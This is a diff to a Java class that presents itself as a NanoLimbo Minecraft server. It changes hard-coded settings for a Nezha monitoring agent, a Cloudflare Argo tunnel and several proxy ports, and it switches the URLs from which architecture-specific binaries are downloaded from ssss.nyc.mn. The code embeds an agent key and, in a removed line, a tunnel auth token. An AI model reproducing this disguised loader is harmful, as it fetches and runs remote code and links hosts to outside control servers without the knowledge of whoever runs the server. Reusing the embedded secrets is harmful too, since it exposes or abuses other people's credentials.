@@ -38,7 +38,7 @@ public final class NanoLimbo {
     private static final String[] ALL_ENV_VARS = {
         "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
         "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
-        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
+        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "S5_PORT", "ANYTLS_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
         "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
     };
     
@@ -122,23 +122,26 @@ public final class NanoLimbo {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "d2a99a43-9fce-49a7-93f6-6b04884f6f3f");
+        envVars.put("UUID", "737cc891-7028-4b33-942b-5d116fc75917");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nezha.9logo.eu.org:443");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "c0FdihFZ8XpqXFbu7muAAPkD5JmeVY4g");
         envVars.put("ARGO_PORT", "9010");
-        envVars.put("ARGO_DOMAIN", "mycuba-fr.milan.us.kg");
-        envVars.put("ARGO_AUTH", "eyJhIjoiNGMyMGE2ZTY0MmM4YWZhNzMzZDRlYzY0N2I0OWRlZTQiLCJ0IjoiNDlhYmM3NWYtZWI5OC00MDM1LThjYzktYmYxNzhhZjkzYzBlIiwicyI6Ik1UY3pZemxpTmpjdE1UTXpPQzAwWkRGakxXRmhPR1l0TXpOaE5tSTBOR1JoWXpnMiJ9");
-        envVars.put("HY2_PORT", "25572");
+        envVars.put("ARGO_DOMAIN", "host2play-us.milan.us.kg");
+        envVars.put("ARGO_AUTH", "");
+        envVars.put("HY2_PORT", "30010");
         envVars.put("TUIC_PORT", "");
-        envVars.put("REALITY_PORT", "25572");
+        envVars.put("REALITY_PORT", "30010");
+        envVars.put("S5_PORT", "");
+        envVars.put("ANYTLS_PORT", "");
+        envVars.put("ANYREALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "");
         envVars.put("BOT_TOKEN", "");
         envVars.put("CFIP", "saas.sin.fan");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "MyCuba-FR");
+        envVars.put("NAME", "Host2Play-US");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -176,11 +179,11 @@ public final class NanoLimbo {
         String url;
         
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.ssss.nyc.mn/s-box";
+            url = "https://amd64.ssss.nyc.mn/sbsh";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.ssss.nyc.mn/s-box";
+            url = "https://arm64.ssss.nyc.mn/sbsh";
         } else if (osArch.contains("s390x")) {
-            url = "https://s390x.ssss.nyc.mn/s-box";
+            url = "https://s390x.ssss.nyc.mn/sbsh";
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
